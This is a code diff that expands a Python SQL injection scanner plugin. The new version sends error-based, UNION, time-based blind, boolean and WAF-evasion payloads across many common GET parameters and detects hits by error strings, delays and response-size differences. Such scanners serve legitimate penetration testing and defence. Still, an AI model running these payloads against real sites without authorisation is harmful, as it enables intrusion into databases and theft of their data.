@@ -1,41 +1,85 @@
 # plugins/sqli_scanner.py
 def run(target, ip, open_ports, banners):
     """
-    Scanner básico de SQLi por GET.
-    Envia payloads clássicos e detecta possíveis vulnerabilidades por padrões na resposta.
+    Scanner SQL Injection via GET.
+    2026 Intel: WAF bypass (case alternation, inline comments, JSON injection),
+    time-based blind, error-based, UNION-based column enum.
     """
     import requests
+    import time
 
+    params = ["id", "user", "username", "page", "name", "search", "query", "cat",
+              "item", "product", "order", "sort", "filter", "type", "action"]
     payloads = [
-        "1'", "1''", "1 or 1=1--", "' OR '1'='1",
-        "1) or (1=1--", "\" OR \"1\"=\"1", "admin'--", "admin' #",
+        # Error-based
+        ("' OR '1'='1", "CLASSIC_OR"),
+        ("' OR '1'='1' --", "CLASSIC_COMMENT"),
+        ("' OR '1'='1' #", "HASH_COMMENT"),
+        ("1' AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL_VERSION"),
+        ("' UNION SELECT NULL--", "UNION_NULL"),
+        ("' UNION SELECT NULL,NULL--", "UNION_2COL"),
+        ("' UNION SELECT NULL,NULL,NULL--", "UNION_3COL"),
+        # WAF bypass 2026
+        ("' oR '1'='1", "CASE_ALTERNATION"),
+        ("'/**/OR/**/1=1--", "INLINE_COMMENT"),
+        ("' OR 1=1-- -", "DOUBLE_DASH_SPACE"),
+        ("1' aNd 1=1 aNd '1'='1", "MIXED_CASE_AND"),
+        # Time-based blind
+        ("' OR SLEEP(3)--", "TIME_MYSQL"),
+        ("'; WAITFOR DELAY '0:0:3'--", "TIME_MSSQL"),
+        ("' OR pg_sleep(3)--", "TIME_POSTGRES"),
+        # Boolean-based
+        ("' AND 1=1--", "BOOL_TRUE"),
+        ("' AND 1=2--", "BOOL_FALSE"),
     ]
-    palavras_chave = [
-        "mysql", "syntax", "sql", "warning", "ora-", "sqlite",
-        "error", "unexpected", "you have an error", "unclosed quotation",
-        "postgresql", "microsoft sql", "odbc", "jdbc",
+    sql_errors = [
+        "sql syntax", "mysql_fetch", "ora-", "pg_query", "sqlite3",
+        "unclosed quotation", "you have an error in your sql",
+        "microsoft ole db", "syntax error", "query failed",
+        "warning: mysql", "valid mysql result", "postgresql",
+        "unterminated string", "quoted string not properly terminated",
     ]
     vulns = []
 
-    for payload in payloads:
-        url = f"http://{target}/?id={payload}"
-        try:
-            resp = requests.get(url, timeout=8)
-            lower = resp.text.lower()
-            indicadores = [k for k in palavras_chave if k in lower]
-            if indicadores:
-                vulns.append({
-                    "payload": payload,
-                    "codigo_http": resp.status_code,
-                    "indicadores": indicadores,
-                    "amostra_resposta": resp.text[:300],
-                })
-        except requests.Timeout:
-            continue
-        except Exception as e:
-            vulns.append({"payload": payload, "erro": str(e)})
+    for param in params:
+        for payload, method in payloads:
+            url = f"http://{target}/?{param}={payload}"
+            try:
+                start = time.time()
+                resp = requests.get(url, timeout=10)
+                elapsed = time.time() - start
 
-    return {
-        "plugin": "sqli_scanner",
-        "resultados": vulns if vulns else "Nenhuma vulnerabilidade SQLi clássica detectada"
-    }
+                # Error-based detection
+                for err in sql_errors:
+                    if err.lower() in resp.text.lower():
+                        vulns.append({
+                            "tipo": "SQLI_ERROR_BASED", "metodo": method,
+                            "parametro": param, "severidade": "CRITICO",
+                            "erro": err, "amostra": resp.text[:200],
+                        })
+                        break
+
+                # Time-based detection
+                if "TIME_" in method and elapsed > 2.5:
+                    vulns.append({
+                        "tipo": "SQLI_TIME_BASED", "metodo": method,
+                        "parametro": param, "severidade": "CRITICO",
+                        "tempo": round(elapsed, 2),
+                    })
+
+                # Boolean-based differential
+                if method == "BOOL_TRUE":
+                    bool_true_len = len(resp.text)
+                elif method == "BOOL_FALSE":
+                    bool_false_len = len(resp.text)
+                    if abs(bool_true_len - bool_false_len) > 50:
+                        vulns.append({
+                            "tipo": "SQLI_BLIND_BOOLEAN",
+                            "parametro": param, "severidade": "ALTO",
+                            "diff": abs(bool_true_len - bool_false_len),
+                        })
+
+            except Exception:
+                continue
+
+    return {"plugin": "sqli_scanner", "resultados": vulns if vulns else "Nenhuma SQL injection detectada"}
